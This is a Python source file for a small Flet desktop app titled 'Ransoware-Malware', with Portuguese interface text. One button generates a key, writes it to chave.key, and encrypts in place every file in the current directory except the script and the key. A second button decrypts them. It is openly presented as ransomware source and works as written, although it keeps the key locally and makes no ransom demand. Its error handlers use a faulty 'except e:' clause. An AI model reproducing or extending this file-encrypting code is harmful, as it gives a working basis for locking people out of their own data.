import os
from cryptography.fernet import Fernet
import flet as ft
files = []
for file in os.listdir():
    if file == 'main.py' or file == 'chave.key':
        continue
    if os.path.isfile(file):
        files.append(file)



            
def main(page: ft.Page):
    page.window_center()
    page.title = 'Ransoware-Malware'
    page.window_width = 400
    page.window_height = 300
    page.window_resizable = False
    page.window_maximizable = False
    
    def close_banner(e):
        page.banner.open = False
        page.update()
    def cryptografando(e):
        try:
            key = Fernet.generate_key()
            with open('chave.key', 'wb') as chave:            
                chave.write(key)
                for file in files:
                        
                    with open(file,'rb') as arquivo:
                        contents = arquivo.read()
                                
                    contents_encryp = Fernet(key).encrypt(contents)
                            
                    with open(file, 'wb') as arquivo:
                        arquivo.write(contents_encryp)
            page.banner.bgcolor = 'green'
            page.banner.leading = ft.Icon(ft.icons.CHECK_CIRCLE_OUTLINE_OUTLINED, color=ft.colors.GREEN_200, size= 40)
            page.banner.content = ft.Text('Arquivos criptografados com sucesso')
            page.banner.open = True
            page.update()
        except e:
            page.banner.bgcolor = 'red'
            page.banner.leading = ft.Icon(ft.icons.ERROR_OUTLINED, color=ft.colors.RED_200, size= 40)
            page.banner.content = ft.Text(f'Desculpe houve o erro {e}')
            page.banner.open = True
            page.update()
    def descryptografando(e):
        try:
            with open('chave.key','rb') as key:
                secretkey = key.read()
            for file in files:
                with open(file, 'rb') as thefile:
                    content = thefile.read()
                content_decrypt = Fernet(secretkey).decrypt(content)
                with open(file,'wb') as thefile:
                    thefile.write(content_decrypt)
            page.banner.bgcolor = 'green'
            page.banner.leading = ft.Icon(ft.icons.CHECK_CIRCLE_OUTLINE_OUTLINED, color=ft.colors.GREEN_200, size= 40)
            page.banner.content = ft.Text('Arquivos descriptografados com sucesso')
            page.banner.open = True
            page.update()
        except e:
            page.banner.bgcolor = 'red'
            page.banner.leading = ft.Icon(ft.icons.ERROR_OUTLINED, color=ft.colors.RED_200, size= 40)
            page.banner.content = ft.Text(f'Desculpe houve o erro {e}')
            page.banner.open = True
            page.update()

    page.banner = ft.Banner(
        actions=[
            ft.TextButton('Ok', on_click=close_banner)
        ]
    )



    text = ft.Text('Escolha uma opção')
    btnCryp = ft.FilledButton('Cryptografar',on_click=cryptografando)
    btnDescrypt = ft.FilledButton('Descryptografar', on_click=descryptografando)
    
    page.add(
        text,
        ft.Row([
            ft.Container(
                content=btnCryp,
            ),
            ft.Container(
                content=btnDescrypt,
            )
        ]),
    )



ft.app(target=main)